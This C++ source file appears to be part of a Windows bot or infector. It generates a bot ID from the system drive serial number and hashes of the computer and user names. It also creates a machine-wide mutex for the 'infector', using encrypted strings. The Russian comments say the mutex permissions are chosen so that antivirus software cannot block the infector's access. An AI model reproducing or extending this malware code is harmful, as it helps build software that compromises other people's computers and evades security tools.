#include "identifier.h"
#include "utils.hpp"
#include "strings.hpp"
#include <AclAPI.h>

typedef BOOL(WINAPI *fnGetSomethingName)(LPWSTR, LPDWORD);

static DWORD GetDataHash(fnGetSomethingName _GetSomethingNameW)
{
	DWORD dwResult = 0xDEADBEEF;
	DWORD dwBufferSize = 0;
	WCHAR wchTmp[2];


	if (_GetSomethingNameW == nullptr)
		return dwResult;

	PWCHAR pwValueField = nullptr;
	do
	{
		if ((!_GetSomethingNameW(wchTmp, &dwBufferSize) && (GetLastError() != ERROR_BUFFER_OVERFLOW) && (GetLastError() != ERROR_INSUFFICIENT_BUFFER)))
		{
#ifdef _DEBUG
			WriteLog(L"[GetDataHash] cant get required size for the data");
#endif
			break;
		}

		if (dwBufferSize == 0)
			break;

		pwValueField = new WCHAR[dwBufferSize + 1];
		if (pwValueField == nullptr)
			break;

		RtlSecureZeroMemory(pwValueField, dwBufferSize * sizeof(WCHAR));

		if (!_GetSomethingNameW(pwValueField, &dwBufferSize))
		{
#ifdef _DEBUG
			WriteLog(L"[GetDataHash] cant get data");
#endif
			break;
		}

		dwResult = 0;
		crc32_calculator(pwValueField, dwBufferSize * sizeof(WCHAR), &dwResult);

#ifdef _DEBUG
		WCHAR debugOut[1024];
		wsprintfW(debugOut, L"[GetDataHash] data = %s, crc32 = 0x%x", pwValueField, dwResult);
		WriteLog(debugOut);
#endif

	} while (FALSE);

	if (pwValueField != nullptr)
	{
		delete[]pwValueField;
		pwValueField = nullptr;
	}

	return dwResult;
}

DWORD GetSerialNumber()
{
	DWORD dwResult = 0xDEADBEEF;

	WCHAR wchWindowsDirectory[MAX_PATH + 1];
	do
	{
		if (!GetWindowsDirectoryW(wchWindowsDirectory, MAX_PATH))
			break;

		wchWindowsDirectory[3] = L'\0';

		if (!GetVolumeInformationW(wchWindowsDirectory, NULL, 0, &dwResult, 0, 0, NULL, 0))
		{
#ifdef _DEBUG
			WriteLog(L"[GetSerialNumber] cant get serial number of ", wchWindowsDirectory);
#endif
			break;
		}

	} while (FALSE);

	return dwResult;
}


void identification_init()
{
	// ID бота - ID железа + ID пользователя
	// ID железа - серийник системного диска + hash(computer name)
	// ID пользователя - hash(user name)

	CCryptString cStr_formatid(cryptedstr_formatid);
	CCryptString cStr_formatbotid(cryptedstr_formatbotid);

	DWORD dwCrc32ComputerName = GetDataHash(GetComputerNameW);;
	DWORD dwCrc32UserName = GetDataHash(GetUserNameW);
	DWORD dwSerialNumber = GetSerialNumber();

	global_data::pwBotID = new WCHAR[128];
	global_data::pwHardwareID = new WCHAR[128];

	if ((global_data::pwBotID == nullptr) || (global_data::pwHardwareID == nullptr))
		return;

	wsprintfW(global_data::pwHardwareID, cStr_formatid.w_str(), dwSerialNumber, dwCrc32ComputerName);
	wsprintfW(global_data::pwBotID, cStr_formatbotid.w_str(), dwSerialNumber, dwCrc32ComputerName, dwCrc32UserName);

	return;
}

static BOOL SetAttributesEveryone(LPSECURITY_ATTRIBUTES *ppsa, PACL *ppACL)
{
	BOOL bRet = FALSE;

#ifdef _DEBUG
	WriteLog(L"[SetAttributesEveryone] creating security attributes by creating security descriptor with DACL full access to everyone");
#endif

	PSID pEveryoneSID = nullptr;
	PACL pACL = nullptr;
	PSECURITY_ATTRIBUTES psa = nullptr;
	PSECURITY_DESCRIPTOR pSD = nullptr;
	EXPLICIT_ACCESSW ea;

	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	do
	{
		if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
		{
#ifdef _DEBUG
			WriteLog(L"[SetAttributesEveryone] cant allocate and initialize SECURITY_WORLD_RID");
#endif
			break;
		}

		RtlSecureZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));

		// разрешим всем пользователям стандартные права кроме WRITE_DAC, так как разрешить кому-то изменять DACL небезопасно, аверы могут заблочить инфектору доступ
		ea.grfAccessPermissions = DELETE | READ_CONTROL | WRITE_OWNER | SYNCHRONIZE; 
		ea.grfAccessMode = SET_ACCESS;
		ea.grfInheritance = NO_INHERITANCE;
		ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea.Trustee.ptstrName = (LPWSTR)pEveryoneSID;

		if (SetEntriesInAclW(1, &ea, NULL, &pACL))
		{
#ifdef _DEBUG
			WriteLog(L"[SetAttributesEveryone] error SetEntriesInAcl");
#endif
			break;
		}

		pSD = (PSECURITY_DESCRIPTOR)new BYTE[SECURITY_DESCRIPTOR_MIN_LENGTH + 1];
		if (pSD == nullptr)
			break;

		if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
		{
#ifdef _DEBUG
			WriteLog(L"[SetAttributesEveryone] error cant initialize security descriptor");
#endif
			break;
		}

		if (!SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE))
		{
#ifdef _DEBUG
			WriteLog(L"[SetAttributesEveryone] error cant set new DACL to security descriptor");
#endif
			break;
		}

		psa = (PSECURITY_ATTRIBUTES)new BYTE[sizeof(SECURITY_ATTRIBUTES) + 1];
		if (psa == nullptr)
			break;

		psa->bInheritHandle = FALSE;
		psa->nLength = sizeof(SECURITY_ATTRIBUTES);
		psa->lpSecurityDescriptor = pSD;

		*ppsa = psa;
		*ppACL = pACL;

		bRet = TRUE;

	} while (FALSE);

	if (pEveryoneSID)
		FreeSid(pEveryoneSID);

	if (bRet == FALSE)
	{
		if (pACL != nullptr)
			LocalFree(pACL);

		if (pSD != nullptr)
		{
			// :202:4: warning: cannot delete expression with pointer-to-'void' type 'PSECURITY_DESCRIPTOR' (aka 'void *')
			LPBYTE lpTmp = (LPBYTE)pSD;
			delete[]lpTmp;
		}

		if (psa != nullptr)
			delete[]psa;
	}

	return bRet;
}

static BOOL isNoMutex()
{

#ifdef _DEBUG_CMD
	CCryptString cStr_paramnomutex(cryptedstr_paramnomutex);
	if (WriteLogcmd::isParamExists(GetCommandLineW(), cStr_paramnomutex.w_str()))
	{
#ifdef _DEBUG
		WriteLog(L"[sync::CreateMutexAndWait] --nomutex switch, exiting");
#endif
		return TRUE;
	}
#endif

	return FALSE;
}

BOOL sync::CreateMutexAndWait(sync_type_t sync_type, PHANDLE hOutHandle)
{
	if (isNoMutex())
		return TRUE;
	
	if (global_data::pwBotID == nullptr)
		return FALSE;

	PWCHAR pwMutexName = new WCHAR[wcslen(global_data::pwBotID) + 256];
	if (pwMutexName == nullptr)
		return FALSE;

	CCryptString cStr_infectormutex(cryptedstr_infectormutex);
	CCryptString cStr_botmutex(cryptedstr_botmutex);

	LPSECURITY_ATTRIBUTES psa = nullptr;
	PACL pACL = nullptr;

	switch (sync_type)
	{
	case sync::sync_type_t::SYNC_BOT: // бот может быть запущен в разных сессиях
		wsprintfW(pwMutexName, cStr_botmutex.w_str(), global_data::pwBotID);
		break;
	case sync::sync_type_t::SYNC_INFECTOR: // инфектор должен работать лишь 1 на всем компьютере, даже в разных сессиях
		wsprintfW(pwMutexName, cStr_infectormutex.w_str(), global_data::pwHardwareID);
		SetAttributesEveryone(&psa, &pACL);
		break;
	}

#ifdef _DEBUG
	WriteLog(L"[sync::CreateMutexAndWait] Mutex name: ", pwMutexName);
#endif

	BOOL bRet = FALSE;
	HANDLE hMutex = NULL;
	do
	{
		hMutex = CreateMutexW(psa, FALSE, pwMutexName);
		if ((hMutex == NULL) || (GetLastError() == ERROR_ACCESS_DENIED))
		{
			// если мы провалились, то попробуем мьютекс просто открыть
#ifdef _DEBUG
			WriteLog(L"[sync::CreateMutexAndWait] trying to open existing mutex with limited rights (standart without write DACL)");
#endif
			// мьютекс уже существует и у нас, возможно, нет прав на присвоение security descriptor, поэтому попытаемся еще раз через OpenMutex 
			hMutex = OpenMutexW(DELETE | READ_CONTROL | WRITE_OWNER | SYNCHRONIZE, FALSE, pwMutexName);
			if (hMutex == NULL)
			{
#ifdef _DEBUG
				WCHAR debugOut[1024];
				wsprintfW(debugOut, L"[sync::CreateMutexAndWait] OpenMutex failed with NULL - 0x%X", GetLastError());
				WriteLog(debugOut);
#endif
				break;
			}
		}

#ifdef _DEBUG
		WriteLog(L"[sync::CreateMutexAndWait] Waiting to take mutex ownership when signaled...");
#endif

		if (WAIT_FAILED == WaitForSingleObject(hMutex, INFINITE))
		{
#ifdef _DEBUG
			WriteLog(L"[sync::CreateMutexAndWait] wait for single object failed");
#endif
			CloseHandle(hMutex);
			break;
		}

#ifdef _DEBUG
		WriteLog(L"[sync::CreateMutexAndWait] we are now owner of mutex and we are the only one who is doing our job");
#endif

		if (hOutHandle != nullptr)
			*hOutHandle = hMutex;

		bRet = TRUE;
	} while (FALSE);

	if (pwMutexName != nullptr)
	{
		delete[]pwMutexName;
		pwMutexName = nullptr;
	}

	if (psa != nullptr)
	{
		if (psa->lpSecurityDescriptor != nullptr)
		{
			// :202:4: warning: cannot delete expression with pointer-to-'void' type 'PSECURITY_DESCRIPTOR' (aka 'void *')
			LPBYTE lpTmp = (LPBYTE)psa->lpSecurityDescriptor;
			delete[]lpTmp;
		}
		delete[]psa;
		psa = nullptr;
	}

	if (pACL != nullptr)
		LocalFree(pACL);

	return bRet;
}
